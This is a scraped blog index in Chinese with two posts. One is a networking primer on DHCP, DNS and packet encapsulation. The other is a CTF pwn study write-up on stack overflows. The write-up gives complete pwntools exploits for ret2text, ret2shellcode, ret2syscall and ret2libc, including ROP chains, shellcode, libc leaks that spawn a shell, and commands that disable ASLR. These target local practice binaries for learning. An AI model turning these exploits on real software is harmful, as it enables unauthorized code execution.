本机IP地址,子网掩码,网关IP地址,DNS的IP地址是TCP/IP协议的重要参数,通俗来说知道它们就可以上网.由于它们是给定的,计算机每次开机都分配到相同的IP地址,所以这种方法被称作静态IP地址上网.\n但是出于简便性,并且避免IP地址无法灵活变更,大多数用户使用\u0026quot;动态IP上网\u0026rdquo;.\n动态IP地址 计算机开机后会自动分配到一个IP地址,不用人为设定,它们使用的协议叫做DHCP协议.该协议规定每个子网中都有一台计算机负责管理本网络的所有IP地址,叫做DHCP服务器.新的计算机加入网络,必须向DHCP服务器发送一个DHCP请求数据报,申请IP地址和相关的网络参数.(指定管理IP地址的DHCP服务器未开机怎么办????)\n新加入的计算机不知道不同子网计算机的MAC地址和IP地址,如何发送数据报?DHCP协议作出了巧妙规定:\n由于DHCP是一种建立在UDP协议基础上的应用层协议,所以整个数据报长这个样子:\n最前面的Ethernet Head,设置发出方的MAC地址和接收方(DHCP服务器)的MAC地址,前者就是本机网卡的MAC地址,后者此时不知道,填入广播地址FF:FF:FF:FF\n后面的IP Head,设置发出方的IP地址和接收方的IP地址,这时对于这两者本机都不知道,于是发出方的IP地址设为0.0.0.0,接收方IP地址设为255.255.255.255\n最后的UDP Head,设置发出方的端口和接收方的端口.DHCP协议规定发出方是port 68,接收方是port 67.\n这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道”这个包是发给我的”，而其他计算机就可以丢弃这个包。\n接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个”DHCP响应”数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。\n实例 假设网络参数如下:\n本机IP:192.168.1.100,子网掩码255.255.255.0,网关IP:192.168.1.1,DNS的IP地址:8.8.8.8\n然后打开了Google Chrome,输入了www.google.com,接下来浏览器将要向Google发送一个网页请求数据报.\nDNS协议 发送数据报就要知道对方的IP地址,我么可以通过DNS协议将网址转换为IP地址.已知DNS服务器为8.8.8.8,于是向其发送DNS数据报(port 53):\n之后DNS服务器做出响应,告诉我们Google服务器的IP地址172.194.72.105.\n子网掩码 得到IP地址后要通过子网掩码来判断改IP是否在同一个子网,以确定要不要向网关发包.将子网掩码与自己的IP地址和Google的IP地址进行AND运算,发现结果不相等,所以不在一个子网.所以我们要向Google发送数据报,必须通过网关192.168.1.1转发,也就是说接收方的IP地址将是网关的MAC地址.\n应用层协议 浏览网页用到的是HTTP协议,它的数据报长下面这个样子:\nGET / HTTP/1.1 Host: www.google.com Connection: keep-alive User-Agent: Mozilla/5.0 (Windows NT 6.1) …… Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Encoding: gzip,deflate,sdch Accept-Language: zh-CN,zh;q=0.8 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3 Cookie: … …\n被嵌在TCP数据报之中,假定为4960字节.\nTCP协议 TCP数据报需要设置端口,接收方的HTTP默认端口是80,而发送方的端口是1024-65535之间随机确定的. 假定为51775.TCP数据报的Head长为20字节,加上嵌入HTTP的数据报,总长度变为4980字节.\nIP协议 然后TCP数据报再嵌入IP数据报,IP数据报需要设置双方的IP地址,这是已知的.发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。\nEthernet协议 最后IP数据报嵌入以太网数据报,以太网数据报设置双方的MAC地址,发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。\n以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。\n服务器端响应 经过多个网关转发,Google服务器收到了这四个以太网数据报.根据IP Head的序号,Google将四个包拼接起来,取出完整的TCP数据,根据其中的HTTP请求作出HTTP响应,再用TCP协议发回.本机收到HTTP响应后,就可以将网页显示出来,完成一次网络通信.\n","date":"2020-07-16T15:24:35+08:00","permalink":"https://wander1ng.com/post/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/","section":"post","tags":["网络基础设施"],"title":"互联网协议入门"},{"categories":null,"contents":"从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。\n0X01\u0026ndash;栈溢出的基本原理：\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。\n函数调用指令: CALL(注意理解EBP的变化过程，它指向下一条指令要操作的数据)\n大致过程:\n参数入栈 返回地址入栈 代码区块跳转 栈帧调整:\n保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈) 将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部) 给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶) 0X02\u0026ndash;栈溢出的保护类型：\n知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。\nCanary：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \\x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。编译时的关闭指令：-fno-stack-protector\nALSR与PIE(Position Independent Executable)：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功） 编译时ALSR的关闭指令：echo 0\u0026gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态，可以用cat+路径显示相关的参数： 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。\nPIE编译时的关闭指令：-no-pie，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。\nLinux平台下的NX,Windows平台上的DEP：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。\n0X03\u0026ndash;编译指令：\ngcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie）\nsudo -s echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\n($ cat /proc/sys/kernel/randomize_va_space指令检查) exit（关闭ALSR) -z execstack（关闭NX保护）\ntest.c -o test(由test.c生成test可执行文件)\n-g(GDB调试)\n0X04\u0026ndash;ROP原理：\n随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：\n程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ropgadget，注意命令格式：ROPgadget \u0026ndash;binary [文件名] \u0026ndash;only’寄存器名|寄存器名’ | grep ‘eax’。\n0X05\u0026ndash;四种类型：\n第一种类型ret2text:\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\rvoid success() { puts(“You Hava already controlled it.”); }\rvoid vulnerable()\r{\rchar s[12];\rgets(s);\rputs(s);\rreturn;\r}\rint main(int argc, char **argv) {\rvulnerable();\rreturn 0;\r} 只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。\nEXP如下：\n##coding=utf8\r## 导入pwntools库\rfrom pwn import *\r## 构造与程序交互的对象，sh = process(\u0026#39;./文件名\u0026#39;)表示打本地，日自己。\rsh = process(\u0026#39;./stack_example\u0026#39;)\r## 已知了想要执行的函数地址\rsuccess_addr = 0x0804843b\r## 构造payload\rpayload = \u0026#39;a\u0026#39; * 0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr)\r##print可以帮助自己看脚本执行到了哪一步\rprint p32(success_addr)\r## 向程序发送字符串\rsh.sendline(payload)\r## 将代码交互转换为手工交互\rsh.interactive() int __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(_bss_start, 0, 1, 0);\rputs(\u0026#34;There is something amazing here, do you know anything?\u0026#34;);\rgets((char *)\u0026amp;v4);\rprintf(\u0026#34;Maybe I will tell you next time !\u0026#34;);\rreturn 0;\r} 首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(\u0026quot;/bin/sh\u0026quot;)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。\n.text:080486A7 lea eax, [esp+1Ch]\r.text:080486AB mov [esp], eax ; s\r.text:080486AE call _gets 由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。\ngef➤ b *0x080486AE\rBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\rgef➤ r\rThere is something amazing here, do you know anything?\rBreakpoint 1, 0x080486ae in main () at ret2text.c:24\r24 gets(buf);\r───────────────────────────────────────────────────────────────────────[ registers ]────\r$eax : 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebx : 0x00000000\r$ecx : 0xffffffff\r$edx : 0xf7faf870 → 0x00000000\r$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebp : 0xffffcdc8 → 0x00000000\r$esi : 0xf7fae000 → 0x001b1db0\r$edi : 0xf7fae000 → 0x001b1db0\r$eip : 0x080486ae → \u0026lt;main+102\u0026gt; call 0x8048460 \u0026lt;gets@plt\u0026gt; 断点下在Call处**为什么是这个Call处？**(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。\n每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。\nEXP如下：\n##!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2text\u0026#39;)\rtarget = 0x0804863a\rsh.sendline(\u0026#39;A\u0026#39; * (0x6c+4) + p32(target))\rsh.interactive() 上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。\n第二种类型ret2shellcode：\nret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;No system for you this time !!!\u0026#34;);\rgets((char *)\u0026amp;v4);\rstrncpy(buf2, (const char *)\u0026amp;v4, 0x64u);\rprintf(\u0026#34;bye bye ~\u0026#34;);\rreturn 0;\r} 程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。\n.bss:0804A080 public buf2\r.bss:0804A080 ; char buf2[100] 通过vmmap观察该bss段是否可执行：\ngef➤ b main\rBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.\rgef➤ r\rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:8\r8 setvbuf(stdout, 0LL, 2, 0LL);\r─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────\r6 int main(void)\r7 {\r→ 8 setvbuf(stdout, 0LL, 2, 0LL);\r9 setvbuf(stdin, 0LL, 1, 0LL);\r10 ─────────────────────────────────────────────────────────────────────[ trace ]────\r[#0] 0x8048536 → Name: main()\r─────────────────────────────────────────────────────────────────────────────────────────────────────\rgef➤ vmmap Start End Offset Perm Path\r0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\r0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\r0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\r0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\r0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\r0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]\r0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\r0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\r0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\r0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\r0xfffdd000 0xffffe000 0x00000000 rwx [stack] 所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。\nEXP如下:\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2shellcode\u0026#39;)\r## 自动生成shellcode\rshellcode = asm(shellcraft.sh())\rbuf2_addr = 0x804a080\r## shellcode先放入，剩余的再用\u0026#39;A\u0026#39;填充至112长度。\rsh.sendline(shellcode.ljust(112, \u0026#39;A\u0026#39;) + p32(buf2_addr))\rsh.interactive() 第三种类型：ret2syscall： 即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。\nexecve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) 由于该程序是 32 位，所以我们需要使得\n系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。\n具体实现\u0026ndash;ropgadgets 这个工具:\nonly ‘pop|ret’ | grep \u0026rsquo;eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。\n平凡无奇的存在栈溢出漏洞的程序源码如下：\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;This time, no system() and NO SHELLCODE!!!\u0026#34;);\rputs(\u0026#34;What do you plan to do?\u0026#34;);\rgets(\u0026amp;v4);\rreturn 0;\r} 想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。\n此外，我们需要获得 /bin/sh 字符串对应的地址。\n➜ ret2syscall ROPgadget --binary rop --string \u0026#39;/bin/sh\u0026#39; Strings information\r============================================================\r0x080be408 : /bin/sh 以及int 0x80的地址：\n➜ ret2syscall ROPgadget --binary rop --only \u0026#39;int\u0026#39; Gadgets information\r============================================================\r0x08049421 : int 0x80\r0x080938fe : int 0xbb\r0x080869b5 : int 0xf6\r0x0807b4d4 : int 0xfc\rUnique gadgets found: 4 EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./rop\u0026#39;)\r## 找到的gadgets及其地址\rpop_eax_ret = 0x080bb196\rpop_edx_ecx_ebx_ret = 0x0806eb90\rint_0x80 = 0x08049421\rbinsh = 0x80be408\r## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。\rpayload = flat([\u0026#39;A\u0026#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\rsh.sendline(payload)\rsh.interactive() payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。\n第四种类型：ret2libc\nlibc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(\u0026quot;/bin/sh\u0026quot;).\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(_bss_start, 0, 1, 0);\rputs(\u0026#34;RET2LIBC \u0026gt;_\u0026lt;\u0026#34;);\rgets((char *)\u0026amp;v4);\rreturn 0;\r} 确定存在栈溢出漏洞,用IDA找到了system函数,用ropgadget查找到\u0026quot;/bin/sh\u0026quot;。\n则EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2libc1\u0026#39;)\rbinsh_addr = 0x8048720\rsystem_plt = 0x08048460\rpayload = flat([\u0026#39;a\u0026#39; * 112, system_plt, \u0026#39;b\u0026#39; * 4, binsh_addr])\rsh.sendline(payload)\rsh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以\u0026rsquo;bbbb\u0026rsquo; 作为虚假的地址，其后参数对应的参数内容。\n当查找不到\u0026quot;/bin/sh\u0026quot;时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。\nEXP如下：\n##!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2libc2\u0026#39;)\rgets_plt = 0x08048460\rsystem_plt = 0x08048490\rpop_ebx = 0x0804843d\rbuf2 = 0x804a080\rpayload = flat([\u0026#39;a\u0026#39; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])\rsh.sendline(payload)\rsh.sendline(\u0026#39;/bin/sh\u0026#39;)\rsh.interactive() 注意payload中的pop_ebx是用来平衡堆栈的。\n同时找不到\u0026quot;/bin/sh\u0026quot;与system()函数地址的情况，用到了两个知识点：\nsystem 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。 所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。\n此外，libc中是一定存在\u0026quot;/bin/sh\u0026quot;的，所以字符串地址也可以获取。这方面工具做的很完善。\n示例：\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;No surprise anymore, system disappeard QQ.\u0026#34;);\rprintf(\u0026#34;Can you find it !?\u0026#34;);\rgets((char *)\u0026amp;v4);\rreturn 0;\r} 思路：\n泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\r## 导入工具\rfrom LibcSearcher import LibcSearcher\r## 本地连接\rsh = process(\u0026#39;./ret2libc3\u0026#39;)\r## 将文件加载入进程\rret2libc3 = ELF(\u0026#39;./ret2libc3\u0026#39;)\r##简化libc库中函数地址的表示方法\rputs_plt = ret2libc3.plt[\u0026#39;puts\u0026#39;]\rlibc_start_main_got = ret2libc3.got[\u0026#39;__libc_start_main\u0026#39;]\rmain = ret2libc3.symbols[\u0026#39;main\u0026#39;]\r## 监视程序进行到哪一步，提醒自己\rprint \u0026#34;leak libc_start_main_got addr and return to main again\u0026#34;\r## puts函数泄露出start_main函数地址\rpayload = flat([\u0026#39;A\u0026#39; * 112, puts_plt, main, libc_start_main_got])\r## 在输出前面字符串后，将payload输入\rsh.sendlineafter(\u0026#39;Can you find it !?\u0026#39;, payload)\rprint \u0026#34;get the related addr\u0026#34;\r##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式\rlibc_start_main_addr = u32(sh.recv()[0:4])\r##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。\rlibc = LibcSearcher(\u0026#39;__libc_start_main\u0026#39;, libc_start_main_addr)\r## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。\rlibcbase = libc_start_main_addr - libc.dump(\u0026#39;__libc_start_main\u0026#39;)\r## 已知基地址与相对地址，得到绝对地址\rsystem_addr = libcbase + libc.dump(\u0026#39;system\u0026#39;)\rbinsh_addr = libcbase + libc.dump(\u0026#39;str_bin_sh\u0026#39;)\r## 监视程序进行到哪一步\rprint \u0026#34;get shell\u0026#34;\rpayload = flat([\u0026#39;A\u0026#39; * 104, system_addr, 0xdeadbeef, binsh_addr])\rsh.sendline(payload)\rsh.interactive() 0X05\u0026ndash;稍作总结：\nret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。\n0X06\u0026ndash;MISC:\n1.最简单栈溢出，一套工具解决。\npython pattern.py create 150 gdb X run (input) q(uit) python pattern.py offset (address)\n即可得到溢出地址\n2.注意是返回地址，不是/bin/sh本身在栈上。\n3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。\n4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。\n5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。\n6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。\n7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。\n8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。\n9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。\n10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。 PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。\n11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分： 1.栈区（stack）：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.堆区（heap)： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回 收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.数据区：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.代码区：存放函数体的二进制代码。\n12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是\n\\x3b\\x84\\x04\\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \\，x 等也算一个单独的字符。。所以我们需要想办法将 \\x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。\n13.常见的危险函数如下\n输入 gets，直接读取一行，忽略\u0026rsquo;\\x00' scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到\u0026rsquo;\\x00\u0026rsquo;停止 strcat，字符串拼接，遇到\u0026rsquo;\\x00\u0026rsquo;停止 bcopy 计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式\n相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求\n覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。\n0X06\u0026ndash;尚存在的问题:\n1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。\n2.ESP的调试为什么断点下在CALL处。\n3.buf两端的问题。\n4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。 解决此问题最简单的方法就是开启core dump功能，即： ulimit -c unlimited sudo sh -c ‘echo “/tmp/core.%t” \u0026gt; /proc/sys/kernel/core_pattern’ 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。\nCTF-Wiki\u0026gt;Linux Pwn:\nStack Overflow principle\nBasic 